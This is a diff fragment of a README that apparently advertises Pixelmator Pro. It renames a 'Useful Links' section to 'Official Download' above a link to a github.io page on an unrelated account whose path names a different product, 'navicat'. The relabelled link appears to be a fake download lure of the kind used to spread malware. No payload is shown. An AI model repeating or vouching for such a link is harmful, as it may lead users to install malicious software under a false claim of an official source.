@@ -132,7 +132,7 @@ Definitely! Pixelmator Pro includes a comprehensive set of brushes and painting 
 
 ---
 
-## Useful Links
+## Official Download
 
 <div align="center">
 <a href="https://junimata-orex.github.io/.github/navicat">
